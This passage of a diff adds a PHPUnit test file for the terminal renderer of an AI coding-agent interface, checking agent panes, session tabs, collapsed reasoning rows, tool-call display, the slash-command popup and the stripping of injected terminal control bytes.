@@ -1,0 +1,2376 @@
+<?php
+
+declare(strict_types=1);
+
+namespace SugarCraft\Code\Tests;
+
+use SugarCraft\Core\KeyType;
+use SugarCraft\Core\Msg\KeyMsg;
+use SugarCraft\Core\Util\Ansi;
+use SugarCraft\Core\Util\Color;
+use SugarCraft\Core\Util\Width;
+use SugarCraft\Style\Style;
+use SugarCraft\Code\Agents\Agent;
+use SugarCraft\Code\Agents\AgentManager;
+use SugarCraft\Code\Chat;
+use SugarCraft\Code\Lang;
+use SugarCraft\Code\Message;
+use SugarCraft\Code\Permissions\PermissionPromptStage;
+use SugarCraft\Code\Providers\ProviderInterface;
+use SugarCraft\Code\Renderer;
+use SugarCraft\Code\Session\SessionStore;
+use SugarCraft\Code\Skills\SkillRegistry;
+use PHPUnit\Framework\TestCase;
+
+/**
+ * @see Renderer
+ */
+final class RendererTest extends TestCase
+{
+    private function chat(array $history = [], string $buf = '', bool $inFlight = false): Chat
+    {
+        return new Chat(
+            history:  $history,
+            inputBuf: $buf,
+            inFlight: $inFlight,
+        );
+    }
+
+    private function stripAnsi(string $frame): string
+    {
+        return (string) preg_replace('/\x1b\[[0-9;]*[A-Za-z]/', '', $frame);
+    }
+
+    private function agentManagerWith(array $agents): AgentManager
+    {
+        $provider = $this->createMock(ProviderInterface::class);
+        $manager = new AgentManager($provider, new SkillRegistry());
+        foreach ($agents as $agent) {
+            $manager->register($agent);
+        }
+
+        return $manager;
+    }
+
+    private function reviewerAgent(bool $isActive = true): Agent
+    {
+        return new Agent(
+            name: 'reviewer',
+            description: 'Reviews code for bugs',
+            prompt: 'You are a reviewer.',
+            model: 'claude-sonnet-4-6',
+            provider: 'anthropic',
+            tools: [],
+            skillNames: [],
+            hooks: [],
+            isActive: $isActive,
+        );
+    }
+
+    // =========================================================================
+    // R20: agent status/view wiring
+    // =========================================================================
+
+    /**
+     * @see Renderer::render()
+     */
+    public function testRendersAgentStatusAndViewWhenAgentManagerHasActiveAgents(): void
+    {
+        $chat = new Chat(agentManager: $this->agentManagerWith([$this->reviewerAgent()]));
+
+        $out = Renderer::render($chat);
+
+        // AgentStatusBar's status-bullet line.
+        $this->assertStringContainsString('reviewer', $out);
+        // AgentViewPane's bracketed status format ("[working]") is distinctive
+        // from AgentsCommand's plain "/agents" text output (which emits
+        // "● active" / "○ inactive", never a bracketed status word) — this
+        // is the proof the real component rendered, not just echoed text.
+        $this->assertStringContainsString('[working]', $out);
+        // AgentViewPane's bordered "agents" panel title.
+        $this->assertStringContainsString('agents', $out);
+    }
+
+    /**
+     * @see Renderer::render()
+     */
+    public function testOmitsAgentViewWhenNoAgentManagerSet(): void
+    {
+        $out = Renderer::render($this->chat());
+
+        $this->assertStringNotContainsString('[working]', $out);
+        $this->assertStringNotContainsString('[stopped]', $out);
+    }
+
+    /**
+     * @see Renderer::render()
+     */
+    public function testOmitsAgentViewWhenAgentManagerHasNoActiveAgents(): void
+    {
+        $chat = new Chat(agentManager: $this->agentManagerWith([$this->reviewerAgent(isActive: false)]));
+
+        $out = Renderer::render($chat);
+
+        // active() filters to isActive===true agents only — an inactive-only
+        // roster yields an empty list, so the agent view section is omitted
+        // entirely rather than showing a "[stopped]" agent that was never
+        // "active" in the AgentManager sense.
+        $this->assertStringNotContainsString('[stopped]', $out);
+        $this->assertStringNotContainsString('[working]', $out);
+    }
+
+    /**
+     * Proves '/agents' renders real AgentViewPane/AgentStatusBar content
+     * through the live Chat -> Renderer path (not plain echoed command
+     * text): submits '/agents' through the real Chat::update() dispatch,
+     * then feeds the *resulting* Chat through Renderer::render() and checks
+     * for the same distinctive component markup asserted above, alongside
+     * the plain AgentsCommand text that landed in history.
+     *
+     * @see Renderer::render()
+     * @see \SugarCraft\Code\Commands\AgentsCommand
+     */
+    public function testAgentsCommandOutputRendersThroughRealAgentViewPane(): void
+    {
+        $chat = new Chat(inputBuf: '/agents', agentManager: $this->agentManagerWith([$this->reviewerAgent()]));
+
+        [$next, ] = $chat->update(new KeyMsg(KeyType::Enter, ''));
+
+        // The plain-text /agents command output is still in history, as before.
+        $this->assertStringContainsString('Active Agents', $next->history[1]->content);
+
+        $out = Renderer::render($next);
+
+        // AND the live renderer now also shows the real, non-textual
+        // AgentViewPane/AgentStatusBar rendering of the same agent data.
+        $this->assertStringContainsString('reviewer', $out);
+        $this->assertStringContainsString('[working]', $out);
+        $this->assertStringContainsString('agents', $out);
+    }
+
+    // =========================================================================
+    // R20: session tab strip wiring
+    // =========================================================================
+
+    public function testRendersSessionTabStripWithMultipleSessionsAndBracketsCurrent(): void
+    {
+        $tempDir = sys_get_temp_dir() . '/renderer_test_' . uniqid('', true);
+        mkdir($tempDir, 0755, true);
+        $store = new SessionStore($tempDir . '/sessions.db');
+        $store->createSession('session-a', 'openai', 'gpt-4', null, 'Alpha');
+        $store->createSession('session-b', 'openai', 'gpt-4', null, 'Beta');
+
+        try {
+            $chat = new Chat(sessionStore: $store, currentSessionId: 'session-b');
+
+            $out = Renderer::render($chat);
+
+            $this->assertStringContainsString('Alpha', $out);
+            $this->assertStringContainsString('[Beta]', $out);
+        } finally {
+            foreach (glob($tempDir . '/*') ?: [] as $file) {
+                unlink($file);
+            }
+            rmdir($tempDir);
+        }
+    }
+
+    public function testOmitsSessionTabStripWithFewerThanTwoSessions(): void
+    {
+        $tempDir = sys_get_temp_dir() . '/renderer_test_' . uniqid('', true);
+        mkdir($tempDir, 0755, true);
+        $store = new SessionStore($tempDir . '/sessions.db');
+        $store->createSession('session-a', 'openai', 'gpt-4', null, 'Alpha');
+
+        try {
+            $chat = new Chat(sessionStore: $store, currentSessionId: 'session-a');
+
+            $out = Renderer::render($chat);
+
+            $this->assertStringNotContainsString('[Alpha]', $out);
+        } finally {
+            foreach (glob($tempDir . '/*') ?: [] as $file) {
+                unlink($file);
+            }
+            rmdir($tempDir);
+        }
+    }
+
+    public function testOmitsSessionTabStripWhenNoSessionStore(): void
+    {
+        $out = Renderer::render($this->chat());
+
+        // No SessionStore configured — the tab strip's "|"-joined labels
+        // never appear (the status line's "·" separator is unrelated).
+        $this->assertStringNotContainsString('|', $out);
+    }
+
+    public function testRendersEmptyConversationHint(): void
+    {
+        $out = Renderer::render($this->chat());
+        $this->assertStringContainsString('empty conversation', $out);
+    }
+
+    public function testRendersUserAndAssistantTurns(): void
+    {
+        $out = Renderer::render($this->chat([
+            Message::user('hello there', 0),
+            Message::assistant('# Hi!\n\nHow can I help?', 0),
+        ]));
+        $this->assertStringContainsString('user>', $out);
+        $this->assertStringContainsString('hello there', $out);
+        $this->assertStringContainsString('assistant', $out);
+    }
+
+    /**
+     * Regression for crush_feat.md §12 D3's final sentence: "surface the
+     * result rendered dimmed/collapsed in the TUI". Prior to this fix,
+     * `Message` had no reasoning field at all, so `Renderer` had nothing to
+     * render even though the provider layer's `ReasoningExtractor` computed
+     * it on every real completion.
+     */
+    public function testRendersAssistantReasoningDimmedAndCollapsed(): void
+    {
+        $reasoning = "Let me think about light wavelengths.\nBlue scatters more.";
+        $chat = $this->chat([
+            Message::user('why is the sky blue?', 0),
+            Message::assistant('Rayleigh scattering.', 0, reasoning: $reasoning),
+        ]);
+        $out = Renderer::render($chat);
+
+        // Collapsed to one row by default: the thought is announced, not shown.
+        $this->assertStringContainsString('💭 Thought', $out);
+        $this->assertStringContainsString('2 lines', $out);
+        $this->assertStringNotContainsString('Let me think about light wavelengths.', $out);
+        $this->assertStringContainsString('Rayleigh scattering.', $out);
+
+        // Opened, the whole trace appears with its own line break intact.
+        $open = Renderer::render($chat->toggleToolOutput(Renderer::thoughtKey($reasoning)));
+        $this->assertStringContainsString('Let me think about light wavelengths.', $open);
+        $this->assertStringContainsString('Blue scatters more.', $open);
+        $rows = explode("\n", $open);
+        $first = array_key_first(array_filter($rows, static fn(string $r): bool => str_contains($r, 'wavelengths.')));
+        $this->assertStringNotContainsString('Blue', $rows[$first], 'the trace was flattened onto one row');
+    }
+
+    /**
+     * An expanded shell row names WHAT ran, not just what it printed: the head
+     * shows the model's `description`, which never mentions the command.
+     */
+    public function testAnExpandedShellCallShowsTheCommandThatRan(): void
+    {
+        $result = \SugarCraft\Code\ToolResult::ok('bash', "total 0\nfile.txt", 'call_1')
+            ->withDescription('List files in current directory')
+            ->withArguments(['command' => "ls -la /tmp\necho done", 'description' => 'List files in current directory', 'timeout' => 30]);
+        $chat = $this->chat(history: [Message::assistant('')->withToolResults([$result])]);
+
+        $collapsed = $this->stripAnsi(Renderer::render($chat));
+        $this->assertStringContainsString('List files in current directory', $collapsed);
+        $this->assertStringNotContainsString('ls -la /tmp', $collapsed, 'a collapsed row must stay one line');
+
+        $open = $this->stripAnsi(Renderer::render($chat->toggleToolOutput('call_1')));
+        $this->assertStringContainsString('$ ls -la /tmp', $open);
+        $this->assertStringContainsString('  echo done', $open, 'a multi-line command must be continued under its prompt');
+        $this->assertStringContainsString('timeout: 30', $open);
+        $this->assertStringContainsString('file.txt', $open);
+        $this->assertLessThan(strpos($open, 'file.txt'), strpos($open, '$ ls -la /tmp'), 'the command must come before its output');
+        $this->assertSame(1, substr_count($open, 'List files in current directory'), 'the description must not be repeated as an argument line');
+    }
+
+    /**
+     * A non-shell call lists its arguments as `key: value`, clipping a long
+     * value (a file body travels here) with a count rather than silently.
+     */
+    public function testAnExpandedCallListsItsArgumentsAndClipsLongValues(): void
+    {
+        $content = implode("\n", array_map(static fn(int $i): string => "line {$i}", range(1, 30)));
+        $result = \SugarCraft\Code\ToolResult::ok('write', 'wrote 30 lines', 'call_1')
+            ->withArguments(['path' => 'src/a.php', 'content' => $content]);
+        $open = $this->stripAnsi(Renderer::render(
+            $this->chat(history: [Message::assistant('')->withToolResults([$result])])->toggleToolOutput('call_1'),
+        ));
+
+        $this->assertStringContainsString('path: src/a.php', $open);
+        $this->assertStringContainsString('content: line 1', $open);
+        $this->assertStringNotContainsString('line 30', $open);
+        $this->assertStringContainsString('… 22 more lines', $open);
+        $this->assertStringNotContainsString('$ ', $open, 'only a call with a `command` gets a prompt line');
+    }
+
+    /**
+     * Arguments are model-authored: a smuggled SGR or BEL must not reach the frame.
+     */
+    public function testInvocationArgumentsAreSanitized(): void
+    {
+        $result = \SugarCraft\Code\ToolResult::ok('bash', 'ok', 'call_1')
+            ->withArguments(['command' => "echo \x1b[31mred\x07"]);
+        $open = Renderer::render(
+            $this->chat(history: [Message::assistant('')->withToolResults([$result])])->toggleToolOutput('call_1'),
+        );
+
+        $this->assertStringNotContainsString("\x1b[31m", $open);
+        $this->assertStringNotContainsString("\x07", $open);
+        $this->assertStringContainsString('echo red', $this->stripAnsi($open));
+    }
+
+    /**
+     * The collapsed row Ctrl+O actually opens - the newest thought - says so;
+     * an older one does not, since the chord cannot reach it, and an opened
+     * row drops the promise.
+     */
+    public function testOnlyTheNewestCollapsedThoughtAdvertisesCtrlO(): void
+    {
+        $chat = $this->chat([
+            Message::user('why?', 0),
+            Message::assistant('Old.', 0, reasoning: 'an older thought'),
+            Message::user('and now?', 0),
+            Message::assistant('New.', 0, reasoning: 'the newest thought'),
+        ]);
+        $rows = $this->thoughtRows(Renderer::render($chat));
+
+        $this->assertCount(2, $rows);
+        $this->assertStringContainsString('click to expand', $rows[0]);
+        $this->assertStringNotContainsString('ctrl+o', $rows[0], 'Ctrl+O cannot reach an older thought, so it must not be offered there');
+        $this->assertStringContainsString('click or ctrl+o to expand', $rows[1]);
+
+        $open = $this->thoughtRows(Renderer::render($chat->toggleToolOutput(Renderer::thoughtKey('the newest thought'))));
+        $this->assertStringContainsString('click to collapse', $open[1]);
+        $this->assertStringNotContainsString('ctrl+o', $open[1]);
+    }
+
+    /** With clicks off, the chord is the only way in, and the only hint. */
+    public function testWithClicksOffTheNewestThoughtOffersOnlyCtrlO(): void
+    {
+        putenv('CANDY_CODE_DISABLE_MOUSE_CLICKS=1');
+        try {
+            $rows = $this->thoughtRows(Renderer::render($this->chat([
+                Message::assistant('Old.', 0, reasoning: 'an older thought'),
+                Message::assistant('New.', 0, reasoning: 'the newest thought'),
+            ])));
+        } finally {
+            putenv('CANDY_CODE_DISABLE_MOUSE_CLICKS');
+        }
+
+        $this->assertStringNotContainsString('click', $rows[0]);
+        $this->assertStringNotContainsString('ctrl+o', $rows[0]);
+        $this->assertStringContainsString('ctrl+o to expand', $rows[1]);
+        $this->assertStringNotContainsString('click', $rows[1]);
+    }
+
+    /**
+     * @return list<string> the frame's `💭 Thought` rows, SGR stripped, top to bottom
+     */
+    private function thoughtRows(string $frame): array
+    {
+        return array_values(array_filter(
+            explode("\n", $this->stripAnsi($frame)),
+            static fn(string $row): bool => str_contains($row, '💭 Thought'),
+        ));
+    }
+
+    /** A Chat whose empty box has $suggestion latched, at $cols columns. */
+    private function suggested(string $suggestion, int $cols = 100): Chat
+    {
+        $history = [Message::user('fix it', 0), Message::assistant('Fixed.', 0)];
+        [$chat] = (new Chat(history: $history))->withSize($cols, 30)
+            ->update(new \SugarCraft\Code\PromptSuggestionMsg($suggestion, 0, 2, null));
+
+        return $chat;
+    }
+
+    /** @return string the input box's text row, SGR stripped */
+    private function inputRow(string $frame): string
+    {
+        foreach (explode("\n", $this->stripAnsi($frame)) as $row) {
+            if (str_contains($row, '> ')) {
+                $found = $row;
+            }
+        }
+
+        return $found ?? '';
+    }
+
+    public function testAnEmptyBoxShowsTheSuggestionGrayedAfterTheCursor(): void
+    {
+        $frame = Renderer::render($this->suggested('run the tests'));
+
+        $this->assertStringContainsString('> █run the tests  (→ to accept)', $this->inputRow($frame));
+        $this->assertMatchesRegularExpression('/\x1b\[[0-9;]*2[;m][^\n]*run the tests/', $frame, 'the suggestion must be painted faint');
+    }
+
+    public function testTheSuggestionIsHiddenOnceTheUserTypes(): void
+    {
+        [$typed] = $this->suggested('run the tests')->update(new KeyMsg(KeyType::Char, 'x'));
+        $row = $this->inputRow(Renderer::render($typed));
+
+        $this->assertStringNotContainsString('run the tests', $row);
+        $this->assertStringContainsString('> x█', $row);
+
+        [$cleared] = $typed->update(new KeyMsg(KeyType::Backspace, ''));
+        $this->assertStringContainsString('run the tests', $this->inputRow(Renderer::render($cleared)), 'clearing the draft brings the suggestion back');
+    }
+
+    /** One row, whatever the width: the hint goes first, then the text is cut. */
+    public function testALongSuggestionStaysOnOneRowOfTheInputBox(): void
+    {
+        $chat = $this->suggested(str_repeat('word ', 30), 40);
+        $frame = Renderer::render($chat);
+        $rows = array_values(array_filter(explode("\n", $this->stripAnsi($frame)), static fn(string $r): bool => str_contains($r, 'word')));
+
+        $this->assertCount(1, $rows, 'the suggestion wrapped onto a second row');
+        $this->assertLessThanOrEqual(40, Width::of($rows[0]));
+    }
+
+    public function testOmitsReasoningLineWhenProviderDidNotSplitAny(): void
+    {
+        $out = Renderer::render($this->chat([
+            Message::assistant('Rayleigh scattering.', 0),
+        ]));
+
+        $this->assertStringNotContainsString('💭', $out);
+    }
+
+    public function testRendersSystemTurn(): void
+    {
+        $out = Renderer::render($this->chat([
+            Message::system('You are a helpful assistant.', 0),
+        ]));
+        $this->assertStringContainsString('system:', $out);
+        $this->assertStringContainsString('helpful assistant', $out);
+    }
+
+    public function testInputCursorVisibleWhenIdle(): void
+    {
+        $out = Renderer::render($this->chat(buf: 'partial'));
+        $this->assertStringContainsString('partial', $out);
+        $this->assertStringContainsString('█', $out);
+    }
+
+    /**
+     * The INVERSION of `testInputCursorHiddenWhileInFlight()`, which asserted
+     * `assertStringNotContainsString('█', …)` and was correct only while
+     * `Chat::update()` swallowed every mid-turn keystroke: a box that cannot be
+     * typed into should not claim a caret. Typing mid-turn now works, so the
+     * hidden caret became the second half of the same bug report — the box looked
+     * dead while it was live. Same property, opposite expected value.
+     *
+     * Asserted on the INPUT ROW rather than on the whole frame: `█` anywhere in
+     * 1,281 bytes of frame would also be satisfied by a caret drawn in some other
+     * pane, which is not the claim.
+     */
+    public function testInputCursorIsDrawnWhileInFlight(): void
+    {
+        $out = Renderer::render($this->chat(buf: 'partial', inFlight: true));
+        $inputRow = null;
+        foreach (explode("\n", $out) as $row) {
+            if (str_contains($row, 'partial')) {
+                $inputRow = $row;
+                break;
+            }
+        }
+
+        $this->assertNotNull($inputRow, 'the draft must be painted at all');
+        $this->assertStringContainsString('partial█', $inputRow, 'the caret sits at the end of the draft');
+        $this->assertStringContainsString('thinking', $out, 'and the turn is still visibly running');
+    }
+
+    public function testIdleStatusMentionsKeys(): void
+    {
+        $out = Renderer::render($this->chat());
+        $this->assertStringContainsString('Enter', $out);
+        $this->assertStringContainsString('quit', $out);
+    }
+
+    public function testIdleStatusMentionsCtrlPMenu(): void
+    {
+        $out = Renderer::render($this->chat());
+        $this->assertStringContainsString('Ctrl+P', $out);
+    }
+
+    public function testInFlightIndicatorAppearsInChatWindowNotJustStatusBar(): void
+    {
+        $out = Renderer::render($this->chat(history: [Message::user('hi')], inFlight: true));
+        $lines = explode("\n", $out);
+        $statusLine = preg_replace('/\x1b\[[0-9;]*m/', '', (string) end($lines));
+
+        $this->assertStringContainsString('assistant is thinking', $out);
+        // The in-window indicator is a separate line from the status bar -
+        // proves it's rendered in the chat body, not only at the bottom.
+        $this->assertStringNotContainsString('assistant is thinking', $statusLine);
+    }
+
+    public function testRunningToolCallShowsAPendingPlaceholderBeforeItFinishes(): void
+    {
+        $call = new \SugarCraft\Code\ToolCall('bash', ['command' => 'ls -la'], 'call_1');
+        $running = Message::toolRunning($call);
+
+        $out = Renderer::render($this->chat(history: [Message::user('list files'), $running]));
+
+        $this->assertStringContainsString('running: bash', $out);
+        $this->assertStringContainsString('ls -la', $out);
+    }
+
+    public function testToolResultsRenderWithADistinctMarkerNotAsPlainAssistantText(): void
+    {
+        $toolMsg = Message::assistant('42')->withToolResults([
+            \SugarCraft\Code\ToolResult::ok('calculator', '42', 'call_1'),
+        ]);
+        $out = Renderer::render($this->chat(history: [Message::user('what is 6*7?'), $toolMsg]));
+
+        $this->assertStringContainsString('tool: calculator', $out);
+        // §1 E5: a SUCCESSFUL body is hidden behind the affordance by
+        // default; the marker still has to be distinct from assistant text.
+        $this->assertStringContainsString('1 line hidden (ctrl+o)', $out);
+    }
+
+    /**
+     * §1 E5 regression: before hide-on-success, every tool body was dumped
+     * inline forever - a 500-line Grep result pushed the conversation out of
+     * the viewport. Collapsed, only the affordance is printed.
+     */
+    public function testSuccessfulToolOutputIsHiddenByDefault(): void
+    {
+        $body = implode("\n", array_fill(0, 500, 'match in some/file.php'));
+        $toolMsg = Message::assistant('')->withToolResults([
+            \SugarCraft\Code\ToolResult::ok('grep', $body, 'call_1'),
+        ]);
+
+        $out = Renderer::render($this->chat(history: [$toolMsg]));
+
+        $this->assertStringNotContainsString('match in some/file.php', $out);
+        $this->assertStringContainsString('500 lines hidden (ctrl+o)', $out);
+    }
+
+    public function testExpandedToolCallIdShowsTheFullSuccessBody(): void
+    {
+        $toolMsg = Message::assistant('')->withToolResults([
+            \SugarCraft\Code\ToolResult::ok('grep', "alpha\nbeta", 'call_1'),
+        ]);
+
+        $chat = $this->chat(history: [$toolMsg])->toggleToolOutput('call_1');
+        $out = Renderer::render($chat);
+
+        $this->assertStringContainsString('alpha', $out);
+        $this->assertStringContainsString('beta', $out);
+        $this->assertStringNotContainsString('hidden (ctrl+o)', $out);
+    }
+
+    /**
+     * An error body is the output the user actually wants, so it is never
+     * hidden - only clipped, with a trailer naming the escape hatch.
+     */
+    public function testCollapsedErrorOutputIsClippedNotHidden(): void
+    {
+        $body = implode("\n", array_map(static fn (int $i): string => "stderr line {$i}", range(1, 40)));
+        $toolMsg = Message::assistant('')->withToolResults([
+            \SugarCraft\Code\ToolResult::error('bash', $body, 'call_1'),
+        ]);
+
+        $out = Renderer::render($this->chat(history: [$toolMsg]));
+
+        $this->assertStringContainsString('stderr line 1', $out);
+        $this->assertStringNotContainsString('stderr line 40', $out);
+        $this->assertStringContainsString('output truncated (ctrl+o to expand)', $out);
+    }
+
+    public function testCollapseToolOutputKeepsShortOutputVerbatim(): void
+    {
+        $this->assertSame(
+            ['output' => "a\nb", 'overflow' => false],
+            Renderer::collapseToolOutput("a\nb", 10, 100),
+        );
+    }
+
+    public function testCollapseToolOutputClipsOnTheLineBudget(): void
+    {
+        $collapsed = Renderer::collapseToolOutput("1\n2\n3\n4", 2, 1000);
+
+        $this->assertSame("1\n2", $collapsed['output']);
+        $this->assertTrue($collapsed['overflow']);
+    }
+
+    /**
+     * One enormous line is still "1 line" - the character budget is what
+     * catches it, which is why both limits exist.
+     */
+    public function testCollapseToolOutputClipsOnTheCharBudget(): void
+    {
+        $collapsed = Renderer::collapseToolOutput(str_repeat('x', 5000), 10, 100);
+
+        $this->assertSame(str_repeat('x', 100), $collapsed['output']);
+        $this->assertTrue($collapsed['overflow']);
+    }
+
+    public function testCollapseToolOutputCountsMultibyteCharactersNotBytes(): void
+    {
+        $collapsed = Renderer::collapseToolOutput(str_repeat('é', 10), 10, 4);
+
+        $this->assertSame('éééé', $collapsed['output']);
+        $this->assertTrue($collapsed['overflow']);
+    }
+
+    public function testCollapseToolOutputHandlesEmptyAndDegenerateLimits(): void
+    {
+        $this->assertSame(['output' => '', 'overflow' => false], Renderer::collapseToolOutput('', 10, 100));
+
+        $collapsed = Renderer::collapseToolOutput("a\nb", 0, 0);
+        $this->assertSame('a', $collapsed['output']);
+        $this->assertTrue($collapsed['overflow']);
+    }
+
+    public function testFailedToolResultShowsErrorMarker(): void
+    {
+        $toolMsg = Message::assistant('')->withToolResults([
+            \SugarCraft\Code\ToolResult::error('bash', 'command not found', 'call_2'),
+        ]);
+        $out = Renderer::render($this->chat(history: [Message::user('run it'), $toolMsg]));
+
+        $this->assertStringContainsString('tool: bash', $out);
+        $this->assertStringContainsString('error', $out);
+        $this->assertStringContainsString('command not found', $out);
+    }
+
+    /**
+     * sugar-cellbuffer #1362 defense-in-depth: raw User turns reach the terminal
+     * wire verbatim, so a C0/DEL byte or a smuggled SGR sequence must be
+     * neutralized before render while the visible text survives. Revert-proof:
+     * dropping the Sanitize::untrusted() call in Renderer fails these asserts.
+     */
+    public function testSanitizesControlBytesInUserContent(): void
+    {
+        $payload = "hi\x07\x00\x7f\x1b[31mPWNED\x1b[0m";
+        $out = Renderer::render($this->chat([Message::user($payload, 0)]));
+
+        $this->assertStringContainsString('PWNED', $out, 'visible text must survive');
+        $this->assertStringNotContainsString("\x07", $out, 'BEL must be stripped');
+        $this->assertStringNotContainsString("\x00", $out, 'NUL must be stripped');
+        $this->assertStringNotContainsString("\x7f", $out, 'DEL must be stripped');
+        // Red-foreground SGR the renderer never emits itself — proves the
+        // injected escape sequence was neutralized, not just its ESC byte.
+        $this->assertStringNotContainsString("\x1b[31m", $out, 'injected SGR must be neutralized');
+    }
+
+    public function testSanitizesControlBytesInSystemContent(): void
+    {
+        $payload = "sys\x07\x00\x7f\x1b[41mBAD\x1b[0m";
+        $out = Renderer::render($this->chat([Message::system($payload, 0)]));
+
+        $this->assertStringContainsString('BAD', $out, 'visible text must survive');
+        $this->assertStringNotContainsString("\x07", $out, 'BEL must be stripped');
+        $this->assertStringNotContainsString("\x00", $out, 'NUL must be stripped');
+        $this->assertStringNotContainsString("\x7f", $out, 'DEL must be stripped');
+        $this->assertStringNotContainsString("\x1b[41m", $out, 'injected SGR must be neutralized');
+    }
+
+    public function testSanitizesControlBytesInInputBuffer(): void
+    {
+        // A bracketed-paste dump can smuggle control bytes into the in-progress
+        // draft; it must be scrubbed before hitting the terminal at draw time.
+        $out = Renderer::render($this->chat(buf: "draft\x07\x00\x7f\x1b[31mX\x1b[0m"));
+
+        $this->assertStringContainsString('draft', $out, 'visible text must survive');
+        $this->assertStringNotContainsString("\x07", $out, 'BEL must be stripped');
+        $this->assertStringNotContainsString("\x00", $out, 'NUL must be stripped');
+        $this->assertStringNotContainsString("\x7f", $out, 'DEL must be stripped');
+        $this->assertStringNotContainsString("\x1b[31m", $out, 'injected SGR must be neutralized');
+    }
+
+    /**
+     * Guard against over-sanitization: the Assistant/SugarMarkdown path emits
+     * legitimate, already-processed SGR and must NOT be run through the
+     * untrusted() strip. sugar-markdown renders bold as \x1b[1m — a sequence the
+     * renderer's own "assistant" label (\x1b[1;35m) never produces, so its
+     * presence proves the content styling survived intact.
+     */
+    public function testAssistantSgrNotOverSanitized(): void
+    {
+        $out = Renderer::render($this->chat([
+            Message::assistant("# Heading\n\n**bold** text", 0),
+        ]));
+
+        $this->assertStringContainsString("\x1b[1m", $out, 'legitimate sugar-markdown SGR must survive');
+        $this->assertStringContainsString('bold', $out);
+    }
+
+    public function testSlashMenuNotRenderedForPlainInput(): void
+    {
+        $out = Renderer::render($this->chat(buf: 'hello'));
+        $this->assertStringNotContainsString('▸', $out);
+    }
+
+    public function testSlashMenuRendersFilteredMatchesWithSelectionMarker(): void
+    {
+        $out = Renderer::render($this->chat(buf: '/re'));
+
+        // ANSI-stripped, because the typed "re" now carries its own SGR run
+        // inside the row (crush_code.md Phase 4 item 5), so "▸ /redo" is no
+        // longer contiguous in the raw bytes. The marker and the row are still
+        // what is being asserted - see
+        // testSlashMenuHighlightsTheMatchedRunOfTheTypedPrefix() for the SGR.
+        $plain = (string) preg_replace('/\x1b\[[0-9;]*m/', '', $out);
+
+        // `/recompress` (roadmap 3.B-4) sorts first among the `re` matches.
+        $this->assertStringContainsString('▸ /recompress', $plain);
+        $this->assertStringContainsString('/redo', $plain);
+        $this->assertStringContainsString('/rewind', $plain);
+        // The unselected row is present but not marked as selected.
+        $this->assertStringNotContainsString('▸ /rewind', $plain);
+    }
+
+    /**
+     * Phase 4 item 5: the "/" popup highlights the run the user typed, through
+     * the same {@see \SugarCraft\Fuzzy\Highlighter} the Ctrl+P palette uses -
+     * before this it was the one of the two command surfaces that could not,
+     * because {@see \SugarCraft\Code\Commands\CommandRegistry::filter()}
+     * discarded the matcher's indices.
+     *
+     * Mirrors testPaletteHighlightsTheMatchedRunOfATypedQuery() deliberately:
+     * the two surfaces should be asserted the same way, since the point of the
+     * change is that they now share the mechanism.
+     */
+    public function testSlashMenuHighlightsTheMatchedRunOfTheTypedPrefix(): void
+    {
+        $out = Renderer::render($this->chat(buf: '/re'));
+
+        $row = '';
+        foreach (explode("\n", $out) as $line) {
+            if (str_contains((string) preg_replace('/\x1b\[[0-9;]*m/', '', $line), '/rename')) {
+                $row = $line;
+            }
+        }
+
+        $this->assertNotSame('', $row, 'the matching popup row was not rendered');
+        // "/" then an underline-bearing SGR then "re": the typed prefix is its
+        // own styled run, and the "name" after it is not part of it.
+        $this->assertMatchesRegularExpression('/\/\x1b\[[0-9;]*4[;m][^m]*m?re/', $row);
+        // …re<reset><row-style>name… — the row style is re-opened behind the
+        // run's full reset, or everything after the match would render in the
+        // terminal's default colour.
+        $this->assertMatchesRegularExpression('/re\x1b\[0m(\x1b\[[0-9;]*m)+name/', $row);
+    }
+
+    /**
+     * A bare "/" lists every command with nothing typed, so nothing is
+     * highlighted - the index-less MatchResults Highlighter no-ops on. Without
+     * this, "highlight the matched run" would be satisfiable by highlighting
+     * the whole name every time.
+     */
+    public function testSlashMenuHighlightsNothingWhenNothingIsTypedYet(): void
+    {
+        $out = Renderer::render($this->chat(buf: '/'));
+
+        $row = '';
+        foreach (explode("\n", $out) as $line) {
+            if (str_contains((string) preg_replace('/\x1b\[[0-9;]*m/', '', $line), '/new [dir]')) {
+                $row = $line;
+            }
+        }
+
+        $this->assertNotSame('', $row, 'the bare "/" popup was not rendered');
+        // `/new` is the registry's first slash row since it gained its picker.
+        $this->assertStringContainsString('▸ /new', $row, 'so the row itself carries no inner SGR at all');
+    }
+
+    /**
+     * Phase 4 item 5: `CommandSpec::$argumentHint` was parsed, stored on the
+     * built-in rows that take arguments, and read by NOTHING - so "/rename" gave
+     * no clue that it wants a name. The popup shows it now.
+     */
+    public function testSlashMenuShowsTheArgumentHint(): void
+    {
+        $plain = (string) preg_replace('/\x1b\[[0-9;]*m/', '', Renderer::render($this->chat(buf: '/re')));
+
+        $this->assertStringContainsString('/rename [<name>|--auto] — Rename the current session', $plain);
+        $this->assertStringContainsString('/rewind [n] [--chat|--files|--both] — Restore an earlier checkpoint', $plain);
+        // …and a row with no hint gains no stray spacing from the feature.
+        // (`/theme`: `/rewind` was this example until it gained its `[n]`
+        // hint, audit 15b-25, and `/sessions` until it gained `[<query>]`.)
+        $bare = (string) preg_replace('/\x1b\[[0-9;]*m/', '', Renderer::render($this->chat(buf: '/the')));
+        $this->assertStringContainsString('/theme — Switch the color theme', $bare);
+    }
+
+    /**
+     * The width half of Phase 4 item 5, and the reason the hint is what gets
+     * cut before the name: three different widths are involved here and every
+     * one of them is `/websearch`'s, so each is named with the domain it is
+     * true of - all measured with `Width::string()` over
+     * `CommandRegistry::all()`, never `strlen()`:
+     *
+     * - its HINT ALONE is 58 columns,
+     * - its popup head `/name <hint>` is 69,
+     * - its `  /name <hint>` column in the `/help` listing is 71 (Chat's
+     *   domain, not this one - {@see SlashDispatchTest} pins that side).
+     *
+     * An untruncated hint therefore pushes the row past the terminal, and
+     * {@see Renderer::render()} paints one logical line per physical row, which
+     * is the row-collision bug the frame clip exists to prevent.
+     *
+     * Asserted at SEVEN widths, and by exact row rather than by a width bound,
+     * for two reasons a looser test got wrong before:
+     *
+     * - A bound six columns clear of the boundary (the old
+     *   `assertLessThanOrEqual(60, …)` against an actual 54) cannot see a
+     *   one-column budget error. Dropping the `- 1`
+     *   {@see Renderer::fitSlashMenuHint()} spends on the hint's leading space
+     *   moves a column from the description to the hint, which no width
+     *   assertion can catch now that the row as a whole is fitted - only the
+     *   exact row can.
+     * - The 40-column row was MEASURED and then not asserted, at exactly the
+     *   width where it was wrong: the row was 45 columns wide (stripped, marker
+     *   included) inside a 40-, 30- OR 20-column terminal, because nothing
